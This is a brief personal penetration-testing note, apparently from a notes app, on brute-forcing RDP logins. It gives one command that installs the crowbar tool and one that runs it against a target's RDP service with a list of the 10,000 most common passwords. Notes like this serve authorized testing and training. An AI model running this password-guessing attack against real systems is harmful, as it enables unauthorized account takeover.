---
category: Uncategorized
tags: [pentest]
created: 2024-12-21

---
```bash - kali
sudo apt install crowbar
```

```bash - kali
crowbar -b rdp -s $TARGET/32 -u $USER -C /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -n 1
```


Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
